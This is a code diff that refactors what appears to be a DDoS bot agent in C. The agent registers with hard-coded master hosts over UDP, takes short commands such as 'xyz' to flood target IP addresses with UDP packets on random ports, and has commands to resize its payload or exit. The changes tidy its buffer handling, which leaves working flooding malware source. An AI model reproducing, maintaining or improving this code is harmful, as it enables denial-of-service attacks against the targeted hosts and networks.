@@ -28,9 +28,7 @@ char *master[] = {
 
 #define rand_port() (htons(rand() % 65534))
 
-#define DEFSIZE 1000
-
-int hello();
+void hello();
 int getsock();
 int sendudp(char *host, char *data, int port);
 
@@ -39,12 +37,10 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 	int sock, numread, sock2, timerz = 120, hoe, foke;
 	struct sockaddr_in sa, from, to;
 	socklen_t fromlen;
-	char buf[1024];
+	char buf[BUFSIZ];
 	char arg1[4], *arg2, pass[10], *temp, *unf;
-	void *buf2;
+	char buf2[BUFSIZ];
 	int start, end, stop = 0;
-
-	buf2 = (void *)malloc(DEFSIZE);
 
 	if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
 		perror("socket");
@@ -72,7 +68,7 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 		bzero(arg1, sizeof(arg1));
 		bzero(buf, sizeof(buf));
 		fromlen = sizeof(from);
-		if ((numread = recvfrom(sock, buf, 1024, 0, (struct sockaddr *)&from, &fromlen)) < 0) {
+		if ((numread = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fromlen)) < 0) {
 			perror("recvfrom");
 			continue;
 		}
@@ -89,7 +85,7 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 					if ((sock2 = getsock()) != -1)
 						while (!stop) {
 							to.sin_port = rand_port();
-							sendto(sock2, buf2, sizeof(buf2), 0, (struct sockaddr *)(&to), sizeof(to));
+							sendto(sock2, buf2, BUFSIZ, 0, (struct sockaddr *)(&to), sizeof(to));
 							if (time(NULL) > end) {
 								close(sock2);
 								stop = 1;
@@ -111,9 +107,7 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 				if (strcmp(arg1, "d1e") == 0)
 					exit(1);
 				if (strcmp(arg1, "rsz") == 0) {
-					free(buf2);
-					buf2 = malloc(atoi(arg2));
-					bzero(buf2, sizeof(buf2));
+					bzero(buf2, BUFSIZ);
 				}
 				if (strcmp(arg1, "xyz") == 0) {
 					start = time(NULL);
@@ -129,7 +123,7 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 								to.sin_addr.s_addr = inet_addr(temp);
 								to.sin_port = rand_port();
 								if (!stop)
-									sendto(sock2, buf2, sizeof(buf2), 0, (struct sockaddr *)
+									sendto(sock2, buf2, BUFSIZ, 0, (struct sockaddr *)
 									       (&to), sizeof(to));
 								if (time(NULL) > end) {
 									close(sock2);
@@ -159,17 +153,16 @@ int sendudp(char *host, char *data, int port)
 	if ((unf = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
 		return -1;
 	sendto(unf, data, strlen(data), 0, (struct sockaddr *)&out, sizeof(out));
-	return 1;
+	return 0;
 }
 
-int hello()
+void hello()
 {
 	int i = 0;
 	while (master[i] != NULL) {
 		sendudp(master[i], "*HELLO*", MASTER_PORT);
 		i++;
 	}
-	return 0;
 }
 
 int getsock()
